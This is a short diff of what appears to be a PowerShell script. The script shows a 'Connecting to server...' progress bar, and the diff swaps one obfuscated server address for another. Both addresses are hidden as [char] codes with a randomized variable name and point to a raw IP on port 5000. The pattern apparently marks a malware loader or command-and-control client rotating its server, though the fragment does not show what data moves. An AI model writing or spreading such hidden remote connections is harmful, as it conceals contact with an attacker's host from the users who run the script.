@@ -22,8 +22,8 @@ Write-Host ""
 Show-Progress -Activity "Connecting to server..." -Percent 20
 
 $sUllz = 'http://' + 
-             [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+
-             [char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':5000'
+         [char]50+[char]49+[char]51+'.'+[char]49+[char]53+[char]57+'.'+
+         [char]55+[char]53+'.'+[char]49+[char]53+[char]57+':5000'
 
 try {
 
